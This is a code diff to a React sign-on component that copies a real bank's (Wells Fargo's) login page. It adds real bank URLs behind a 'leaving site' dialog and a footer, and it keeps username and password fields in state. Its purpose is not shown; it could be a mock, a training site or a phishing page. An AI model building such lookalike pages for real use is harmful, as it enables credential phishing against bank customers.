@@ -1,6 +1,8 @@
 import { FormEvent, useState } from "react";
 import { useRouter } from "../router/RouterContext";
 import Logo from "../components/Logo";
+import SiteFooter from "../components/SiteFooter";
+import type { OutsideLinkHandler } from "../components/ContentSections";
 import "./secure-login.css";
 
 function SearchIcon() {
@@ -11,7 +13,7 @@ function PasskeyIcon() {
   return <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="8" r="4" fill="none" stroke="currentColor" strokeWidth="1.8"/><circle cx="8" cy="8" r="1.4" fill="currentColor"/><path d="M12 13.2c1.4 1.1 2.3 2.7 2.5 4.5M15 15l4.5 4.5M18 18l2-2" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>;
 }
 
-export default function SecureLogin() {
+export default function SecureLogin({ onLeave }: { onLeave: OutsideLinkHandler }) {
   const { navigate } = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -33,10 +35,10 @@ export default function SecureLogin() {
         <div className="secure-login-header-inner">
           <Logo />
           <nav className="secure-login-utility" aria-label="Header navigation">
-            <a href="#" onClick={(event) => event.preventDefault()}>Enroll</a>
-            <a href="#" onClick={(event) => event.preventDefault()}>Customer Service</a>
+            <a href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1" aria-haspopup="dialog" onClick={(event) => { event.preventDefault(); onLeave("https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1"); }}>Enroll</a>
+            <a href="https://www.wellsfargo.com/help/" aria-haspopup="dialog" onClick={(event) => { event.preventDefault(); onLeave("https://www.wellsfargo.com/help/"); }}>Customer Service</a>
             <a href="/locations">ATMs/Locations</a>
-            <a href="#" onClick={(event) => event.preventDefault()} lang="es">Español</a>
+            <a href="https://www.wellsfargo.com/es/" lang="es" aria-haspopup="dialog" onClick={(event) => { event.preventDefault(); onLeave("https://www.wellsfargo.com/es/"); }}>Español</a>
             <button type="button" className="secure-login-search" aria-label="Search" aria-expanded={searchOpen} onClick={() => setSearchOpen((value) => !value)}>
               {searchOpen ? <span>Close</span> : <SearchIcon />}
             </button>
@@ -92,9 +94,11 @@ export default function SecureLogin() {
           <button type="button" className="secure-login-passkey" onClick={() => navigate("/portal")}><PasskeyIcon />Use a passkey</button>
           <p className="secure-login-passkey-copy">Don't have one? Create a passkey after signing on and skip the password next time.</p>
 
-          <a className="secure-login-forgot" href="#" onClick={(event) => event.preventDefault()}><span aria-hidden="true">→</span> Forgot username or password?</a>
+          <a className="secure-login-forgot" href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp/" aria-haspopup="dialog" onClick={(event) => { event.preventDefault(); onLeave("https://oam.wellsfargo.com/oamo/identity/help/passwordhelp/"); }}><span aria-hidden="true">→</span> Forgot username or password?</a>
         </section>
       </main>
+
+      <SiteFooter onLeave={onLeave} />
     </div>
   );
 }
